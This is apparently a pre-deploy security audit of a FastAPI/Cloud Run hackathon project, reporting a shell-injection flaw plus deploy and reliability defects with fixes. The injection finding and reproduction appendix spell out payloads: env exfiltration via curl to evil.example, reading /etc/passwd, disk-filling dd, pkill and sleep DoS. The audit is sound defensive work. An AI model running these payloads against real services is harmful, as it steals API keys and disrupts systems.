# chow-lite — Security & Reliability Review (pre-public-deploy)

**Repo:** `/Users/adam26/chow-work/chow-lite` (github.com/optimizedwf/chow-lite, public MIT)
**Scope:** secrets, RCE/command injection, API surface, Firestore rules, deploy artifacts, reliability
**Date:** 2026-08 (pre-submission). **Auditor:** security/reliability engineer pass.
**Method:** full source read + live execution of the real code paths (FastAPI TestClient against `deploy/server.py`, bash simulation of the exact command construction, Docker image-content simulation). Every "verified" finding below was reproduced.

---

## Executive summary

The core library (`chowlite/`, chains, gates, ledger, CLI) is clean, well-structured Python with a genuinely good model (evidence-gated loop, candidate-only learning). The **deploy layer is not production-ready and, as shipped, cannot boot on Cloud Run**. The critical chain is:

1. `POST /v1/submit` is **unauthenticated and public** (`deploy.sh:20 --allow-unauthenticated`).
2. The user `task` string is interpolated into a **bash command** (`deploy/server.py:186`, executed with `shell=True` in `chowlite/runtime/workflows.py:111-113`).
3. The container runs **as root** with `git`+`curl` installed and the full environment (including `GEMINI_API_KEY`, if set) readable.

Net result: **any anonymous internet user can execute arbitrary shell commands inside the Cloud Run container** — exfiltrate the Gemini API key, read/write/delete the Firestore ledger via the app's service account, kill the service, or burn CPU/memory. This is trivially exploitable with a 30-character payload (verified). Separately, the Dockerfile **never copies `deploy/` into the image**, so `uvicorn deploy.server:app` fails at boot (verified by simulation), and Cloud Run's **read-only filesystem** (except `/tmp`) means the EXECUTE step's artifact writes would fail anyway (per the Cloud Run container contract).

Good news: fixes are small. The whole RCE class disappears by **not putting user input into shell commands at all** (write `task.txt` from Python; the demo workflow only needs `echo`/`printf`). No OAuth needed for a hackathon demo — a shared demo token + rate limit + size caps is enough.

---

## Findings

### P0 — must fix before Adam deploys the live URL publicly

#### P0-1 · Unauthenticated remote RCE via shell interpolation in `/v1/submit`  — VERIFIED
- **Where:** `deploy/server.py:186-189` (`cmd = f"echo '{task[:200]}' > task.txt; ..."`, `Node(id="collect", kind="bash", command=cmd)`) → `chowlite/runtime/workflows.py:111-113` (`sp.run(node.command, shell=True, ...)`). Same pattern in the local CLI at `chowlite/cli.py:119`.
- **Exploit:** the task is wrapped in single quotes; a task containing `'` breaks out. Proven payloads (each ≤ 200 chars, so the `task[:200]` truncation does not help):
  ```
  build'; curl -s -d "$(env)" https://evil.example/x; echo '        # exfiltrate ALL env vars (GEMINI_API_KEY)
  build'; cat /etc/passwd; echo '                                   # read files
  build'; dd if=/dev/zero of=big.bin bs=1M count=500; echo '       # 500MB write -> OOM the 512Mi instance (see P1-11)
  build'; pkill -f uvicorn; echo '                                  # kill the service
  ```
  Note `$(...)`/backticks inside single quotes do *not* execute — the working vector is the single-quote breakout, which is the first thing any judge or scanner tries against `echo '...'`.
- **Impact:** full RCE as root (Dockerfile has no `USER`). Concrete attacker wins: (a) exfiltrate `GEMINI_API_KEY` → run up a real bill on Adam's Google account; (b) use the app's service-account credentials to read/write/delete the whole Firestore `chowlite-jobs` collection; (c) kill the demo mid-judging; (d) use the instance as a free compute/smokescreen. `git`+`curl` are preinstalled for exfiltration (`Dockerfile:6`).
- **Why it matters for a demo:** a malicious (or even curious) judge will try this. It is the single most embarrassing possible outcome.
- **Fix (minimal, removes the entire class):** do not interpolate user input into shell. The demo node only needs three constant writes:
  ```python
  job_dir = WORKDIR / job.job_id        # create as today
  (job_dir / "task.txt").write_text(task[:200] + "\n")
  (job_dir / "FINAL_REPORT.md").write_text(f"Artifact: {decision.workflow_id}\n")
  (job_dir / "EVAL.json").write_text(eval_json)
  wf.add_node(Node(id="collect", kind="tool", run=lambda inputs, jd: {"done": True}))
  ```
  (or keep a `bash` node whose command contains **zero** user data — pass the task via a file). If shell is truly needed, use `sp.run([...], shell=False)` with a fixed argv and feed the task through stdin. Do **not** rely on escaping/quoting — `shlex.quote` is not a security boundary against `\n`/`$()` when the shell re-parses, and the 200-char truncation invites truncation-dependent bypasses. Also harden `WorkflowExecutor._run_node` (workflows.py:111): reject `shell=True` commands that contain any interpolated user bytes, and apply the same rule in `chowlite/cli.py:119`.

#### P0-2 · Dockerfile never copies `deploy/` → image cannot boot → live deploy broken  — VERIFIED
- **Where:** `Dockerfile:9-19`. Only `pyproject.toml`, `README.md`, `chowlite/`, `schemas/` are copied; the container command is `uvicorn deploy.server:app`.
- **Evidence:** simulated the image contents (copied exactly what the Dockerfile copies) and ran `import deploy.server` → `ModuleNotFoundError: No module named 'deploy'`. So `gcloud run deploy` succeeds in creating the service, then the revision crashes on boot and Cloud Run marks it unhealthy. **The demo video's "live on Google Cloud" segment cannot be recorded with this Dockerfile.**
- **Fix:** add `COPY deploy ./deploy` to the Dockerfile (one line). Also add `COPY .dockerignore` if created (P1-14).

#### P0-3 · Cloud Run filesystem is read-only except `/tmp` → EXECUTE cannot write artifacts → every submit 500s
- **Where:** `deploy/server.py:52` (`LEDGER_PATH = Path("jobs/ledger.jsonl")`, `WORKDIR = Path("work")`) and `chowlite/runtime/workflows.py:135` (`job_dir.mkdir(...)`).
- **Detail:** per the Cloud Run container contract, only `/tmp` is writable; `/app` is read-only. `WorkflowExecutor.__init__` does `self.workdir.mkdir()` → `PermissionError`/`EROFS` → unhandled → `POST /v1/submit` 500s for every task that reaches EXECUTE. Even on gen2 with any ephemeral overlay, local-FS state is per-instance and lost on recycle — and with `maxScale: 2`, two instances would have divergent ledgers.
- **Impact:** the public API's core endpoint does not work on Cloud Run as configured; the JSONL fallback (P1-7) silently "works" nowhere useful.
- **Fix:** point runtime state at `/tmp`: `LEDGER_PATH = Path(os.environ.get("LEDGER_PATH", "/tmp/chowlite/jobs/ledger.jsonl"))`, `WORKDIR = Path(os.environ.get("WORKDIR", "/tmp/chowlite/work"))` — and treat Firestore as the only durable store (JSONL under /tmp is crash-only). Verify with a real `gcloud run deploy` before recording the GCP proof segment.

#### P0-4 · No auth + no rate limit on a public endpoint that spends real money and writes shared state
- **Where:** `deploy/deploy.sh:20` (`--allow-unauthenticated`), `deploy/server.py:168-201` (no auth, no throttle, no size cap).
- **Impact:** until P0-1 is fixed this is "public RCE"; after P0-1 it is still: unlimited Gemini calls (bill/quota abuse — each submit sends the full task to the model, and tasks are unbounded), unlimited Firestore writes (free-tier quotas: 50k writes / 20k reads per day), cross-user data exposure (anyone can list/read all jobs, see P2-18), and easy DoS (see P1-8/P1-10).
- **Fix (demo-appropriate, no OAuth):** (a) gate `POST /v1/submit` on a shared demo token: `X-API-Key: <DEMO_TOKEN>` compared against `os.environ["DEMO_TOKEN"]` (constant-time compare; 5 lines; put the token in the Devpost/README); (b) a tiny in-memory rate limiter (e.g., 10 req/min per IP via `slowapi` or a 20-line middleware) — sufficient because `maxScale: 2`; (c) Pydantic `task` field with `max_length=2000` (P1-6). Read endpoints (`/health`, `/v1/jobs`, `/v1/stats`) can stay public for the demo.

### P1 — should fix before public deploy / will break the demo

#### P1-5 · A plain apostrophe in a normal task breaks the run — job stuck in "fixing" forever — VERIFIED
- **Where:** `deploy/server.py:186` + `chowlite/runtime/workflows.py:157-163`.
- **Evidence:** `POST /v1/submit {"task": "build it's a trap"}` → shell syntax error (unterminated quote) → exit code 2 → gate verdict `FIX` → `job.transition("fixing")` … and the server has **no fix loop**, so the job sits in `fixing` forever (confirmed in the ledger: `{"by_status": {"fixing": 1, ...}}`). Any judge typing a contraction ("it's", "don't") triggers this.
- **Fix:** same as P0-1 (write files from Python, no shell). Optionally add a fix-loop in the server path or transition FIX → blocked after one attempt.

#### P1-6 · No input validation → 500s on non-string `task` — VERIFIED
- **Where:** `deploy/server.py:168-172` (`payload: dict`; `router.classify(task)` → `redact()` regex gets a non-string).
- **Evidence:** `{"task": 123}` and `{"task": {"a":1}}` raise `TypeError: expected string or bytes-like object` → unhandled → 500 (traceback in uvicorn/Cloud Run logs).
- **Fix:** Pydantic model: `class SubmitBody(BaseModel): task: str = Field(min_length=1, max_length=2000)` → FastAPI returns 422 for wrong types, and this also fixes the unbounded-length problem (P1-8).

#### P1-7 · Silent Firestore→JSONL fallback = silent data loss + split-brain — VERIFIED by code path
- **Where:** `deploy/server.py:45-55` (`get_ledger()` catches *any* exception and returns a JSONL ledger), `deploy/server.py:172/178/204/210/217` (a **new** ledger client per request).
- **Impact:** if Firestore init fails at runtime (API disabled, bad service-account IAM, quota, transient outage), the app quietly starts writing jobs to a local JSONL file — which on Cloud Run is ephemeral (P0-3) and per-instance. `POST /v1/submit` returns `job_id` … then `GET /v1/jobs/{id}` 404s minutes later; `stats` differs per instance. Silent fallback is the worst possible behavior here: the demo looks broken for no visible reason.
- **Fix:** (a) construct ONE module-level `FirestoreLedger` at import (fail fast at boot, not per request); (b) on Firestore failure, either let the request fail with a clear 500 or explicitly log `ERROR` and write JSONL to `/tmp` with a response warning — never silently; (c) ensure the Cloud Run runtime service account has `roles/datastore.user`.

#### P1-8 · No request-body/task size limit → memory DoS
- **Where:** `deploy/server.py:168` (no middleware, no cap). Starlette buffers the whole body; a 50MB *valid* JSON body is fully parsed (a 50MB *invalid* body correctly 422s, but valid ones don't).
- **Impact:** a handful of parallel big bodies (concurrency 8 × 512Mi) OOM-kills instances; unbounded task strings also blow up Gemini prompt cost (P0-4).
- **Fix:** Pydantic `max_length` (P1-6) + a middleware rejecting `Content-Length > 1MB` with 413.

#### P1-9 · Gemini call: no timeout, no retry, no 429 handling — VERIFIED by code read
- **Where:** `chowlite/router/classifier.py:113` (`resp = self.model.generate_content(prompt)`; `build_router` in `server.py:108-150` catches only constructor errors).
- **Impact:** a hung or 429-quota Gemini API call hangs the request thread up to Cloud Run's 300s timeout (P1-10) and surfaces as a 500 — the demo dies the moment the free-tier quota trips (it will, during judging if the site is public).
- **Fix:** (a) pass a client timeout (`genai.Client(..., http_options=...timeout=15)`); (b) wrap `classify()` in try/except → keyword fallback (that's the stated design intent — the fallback currently only covers router *construction*); (c) retry 429 with exponential backoff (2-3 tries).

#### P1-10 · Bash node blocks the request thread up to 300s → trivial availability DoS
- **Where:** `deploy/server.py:189` (Node default `timeout_seconds=300` from `chowlite/runtime/workflows.py:32`), `deploy/cloud-run.yaml` (`timeoutSeconds: 300`, `containerConcurrency: 8`, `maxScale: 2`).
- **Impact:** task `build'; sleep 200; echo '` (12 chars) pins a thread for 200s. 16 concurrent sleepers across 2 instances make the whole public API unavailable for minutes; also Cloud Run's 300s request cap races the 300s node timeout, so clients see 503/504 while the node keeps running.
- **Fix:** set a tight `timeout_seconds` (e.g., 30) on the public-path node; consider running execution as a background task with the job id returned immediately and status polled (nicer demo UX too).

#### P1-11 · Artifact scan `read_bytes()` OOMs on attacker-created giant files — VERIFIED
- **Where:** `chowlite/runtime/workflows.py:166` and `:192` (`data = p.read_bytes()` for every new file in the job dir).
- **Evidence:** `build'; dd if=/dev/zero of=big.bin bs=1M count=500; echo '` fits in 200 chars and creates a 500MB file; the executor then reads it fully into memory → OOM vs the 512Mi limit → instance crash.
- **Fix:** skip/truncate artifacts above a size cap (e.g., 5MB), cap artifact count, and read in chunks.

#### P1-12 · `GEMINI_API_KEY` is not wired into the deploy → the public site silently runs the keyword router
- **Where:** `deploy/deploy.sh:21` (`--set-env-vars GEMINI_MODEL=...,FIRESTORE_COLLECTION=...` — no key, no Secret Manager reference).
- **Impact:** the deployed API is deterministic-keyword routing, so the demo script's "real Gemini routing on the deployed API, conf 1.00" GCP-proof segment (docs/demo-script.md) would be false. And if the key *is* later added via `--set-env-vars`, P0-1 makes it readable by any attacker (`env` is world-readable to RCE).
- **Fix:** wire the key through **Secret Manager** (`--set-secrets GEMINI_API_KEY=projects/.../secrets/...`), or deliberately accept keyword routing on the public site and only show live Gemini routing in the locally recorded segment (demo_live.py) — and change the script/claims accordingly.

#### P1-13 · Firestore rules: any authenticated Firebase user can read/write ALL job docs
- **Where:** `deploy/firestore.rules:5` (`allow read, write: if request.auth != null;`).
- **Detail:** the app's server SDK (service account) **bypasses** security rules, so the app works regardless of these rules. But if the GCP project has Firebase Auth enabled (Google sign-in or anonymous), any authenticated client can enumerate, dump, modify, and delete the entire `chowlite-jobs` collection through the Firestore REST/Web SDK. It's one `curl` per doc.
- **Fix:** since the app never authenticates Firebase users, tighten to `allow read, write: if false;` (server SDK unaffected). At minimum require a role claim (`request.auth.token.admin == true`).

### P2 — nice-to-have / hygiene

#### P2-14 · No `.dockerignore` → ~789MB build context per deploy
`demo_capture/` alone is 766MB (mostly `arch_frames/` PNGs). `gcloud run deploy --source .` uploads the whole tree to Cloud Build every time (slow, GCB storage cost). If Adam ever creates `.env` per README instructions, it rides along into GCB too (it is gitignored but **not** dockerignored). Fix: add `.dockerignore` with `demo_capture/`, `docs/*.mp4`, `work/`, `jobs/*.jsonl`, `.env*`, `.venv/`, `tests/`, `.git/`, `*.mp4`, `*.png`, `*.mp3`, `.coverage`, `.pytest_cache/`.

#### P2-15 · Container runs as root
`Dockerfile:1` has no `USER`. With P0-1 fixed this is mild; still add `RUN useradd --create-home appuser && USER appuser` and make `/tmp`-based state owner-writable.

#### P2-16 · Unpinned dependencies → non-reproducible, frozen demo can rot
`pyproject.toml:9-13` uses `>=` for everything (google-adk, google-genai, fastapi, uvicorn, google-cloud-firestore); `Dockerfile:13` installs `google-cloud-firestore` unpinned. A breaking release between now and judging changes behavior silently. Pin exact versions (at least in the Dockerfile).

#### P2-17 · JSONL append is not atomic or locked
`chowlite/ledger/ledger.py:148-150` appends with plain `open(path,"a")`; concurrent submits (FastAPI threadpool, sync endpoints) can interleave writes and race the in-memory dict. Only affects the JSONL fallback; fix with a `threading.Lock` or prefer Firestore (see P1-7).

#### P2-18 · Raw task text + internal container paths exposed via the public API — VERIFIED
- `deploy/server.py:178` stores `input={"task": task}` raw; `job_detail` (`server.py:210`) returns it to anyone; `redact()` in `classifier.py:159,185` only covers `route_decision.task_redacted`. So anything a user pastes into a task (including secrets) is persisted and publicly readable, and artifact records expose absolute container paths (`/app/work/<job_id>/...`) that help attackers map the environment.
- **Fix:** store only `task_redacted` (or first N chars) in the ledger; make artifact paths relative to the job dir; keep full text only in the response, not the store.

#### P2-19 · Per-request clients
`get_ledger()` and `build_router()` construct a new Firestore client and a new `genai.Client` on every request (server.py:45-55, 108-150). Fix with module-level singletons (also required by P1-7).

#### P2-20 · Ops/process notes
- `tests/test_server.py` exists locally but is **untracked** (not in the frozen GitHub repo) — the public repo's test suite does not cover the API surface. Commit it (and add a regression test for P0-1: submit `build'; id; echo '` and assert no side effects).
- `git status` shows 20 modified files vs HEAD `d7acf3a` — the GitHub repo is not the code reviewed here. Decide: commit-and-push before the freeze, or re-run this review against the frozen tree.
- `.coverage` and `.pytest_cache/` are present but `.gitignore` doesn't list `.coverage`.
- `deploy.sh` smoke test only curls `/health` — extend it to one submit + job fetch so a broken EXECUTE path (P0-3) is caught at deploy time.

---

## Ship-blockers (must fix before Adam deploys the public URL)

1. **Kill the shell interpolation** (P0-1): write `task.txt`/`FINAL_REPORT.md`/`EVAL.json` from Python; no user bytes in any bash command. Also fix `chowlite/cli.py:119`.
2. **`COPY deploy ./deploy`** in the Dockerfile (P0-2) — otherwise nothing boots.
3. **Move runtime state under `/tmp`** (P0-3) and make Firestore failure loud, not silent (P1-7).
4. **Token-gate `/v1/submit`** + Pydantic `task: str, max_length=2000` + request size cap + a simple rate limit (P0-4, P1-6, P1-8).
5. **Wire GEMINI_API_KEY via Secret Manager** or explicitly ship the public site as keyword-routed (P1-12) — and fix the demo-script claim accordingly.
6. **Add `.dockerignore`** (P2-14) so deploys are practical.

After the above: re-run `pytest`, deploy to a throwaway project, and run `deploy/demo_probe.py` against the live URL end-to-end before recording the GCP-proof segment.

## Fine as-is / don't overengineer (demo context)

- **No CORS middleware** — browsers block cross-origin calls to the API; that is correct for a curl/probe-driven demo (verified: `OPTIONS` → 405, no `Access-Control-Allow-Origin`). Revisit only if a browser UI appears.
- **`--allow-unauthenticated`** is the right call for a hackathon (judges must reach the URL with zero friction) — once P0-1 is fixed and submits are token-gated. **Do not build OAuth SSO.**
- **Keyword-router fallback when no key** — good offline/CI behavior; keep.
- **`redact()` regexes** (`classifier.py:39-57`) are explicitly documented as not-a-security-boundary; fine as first-line hygiene once P2-18 is handled.
- **`firestore.rules` best-effort `|| true` in deploy.sh** — acceptable; rules matter little here because the server SDK bypasses them and the app doesn't use Firebase Auth (P1-13 fix is one line anyway).
- **`git`/`curl` in the image** — fine for the demo once RCE is gone (drop git in a slim pass if wanted).
- **Server-fabricated EVAL.json** (`server.py:183-185`): the evidence the gate checks is generated by the server, not produced by a real workflow hop — it's demo theater that still exercises the gate honestly. Acceptable for the demo; don't claim in the writeup that the public API does real verification.
- **Scale-to-zero (`minScale: 0`)** — right call for cost.
- **`google-cloud-firestore` (and ADK) heavyweights in the image** — acceptable; they're the required stack.

## Reproduction appendix

```bash
# P0-1 RCE (proven locally against the real app + real command construction)
curl -s https://<YOUR>.run.app/v1/submit -H 'Content-Type: application/json' \
  -d '{"task": "build\047; curl -s -d \"$(env)\" https://evil.example/x; echo \047"}'

# P1-5 apostrophe demo-breaker (proven: verdict FIX, job stuck "fixing")
curl -s https://<YOUR>.run.app/v1/submit -H 'Content-Type: application/json' \
  -d '{"task": "build it'"'"'s a trap"}'

# P1-6 wrong-type 500 (proven)
curl -s https://<YOUR>.run.app/v1/submit -H 'Content-Type: application/json' -d '{"task": 123}'

# P2-18 raw-task exposure (proven: GET /v1/jobs returns input.task verbatim)
curl -s https://<YOUR>.run.app/v1/jobs | python3 -m json.tool | grep -A2 '"input"'
```

## Change footprint summary

| Fix | Files touched | ~Lines |
|---|---|---|
| P0-1 no-shell artifact writes | deploy/server.py, chowlite/cli.py | +10/-5 |
| P0-2 COPY deploy | Dockerfile | +1 |
| P0-3 /tmp paths + loud Firestore | deploy/server.py | +6 |
| P0-4 token + rate limit | deploy/server.py (+deploy.sh env) | +25 |
| P1-6/8 Pydantic body + 1MB cap | deploy/server.py | +10 |
| P1-9 timeout/retry/fallback | chowlite/router/classifier.py | +10 |
| P1-10/11 node timeout + artifact caps | deploy/server.py, workflows.py | +8 |
| P1-12 Secret Manager | deploy.sh | +3 |
| P1-13 rules `if false` | deploy/firestore.rules | +1 |
| P2-14 .dockerignore | new file | +12 |
| P2-15 non-root | Dockerfile | +2 |
| P2-18 store task_redacted only | deploy/server.py | +2 |

~90 lines total. The architecture is sound; the blast radius is almost entirely in one f-string and one missing `COPY`.
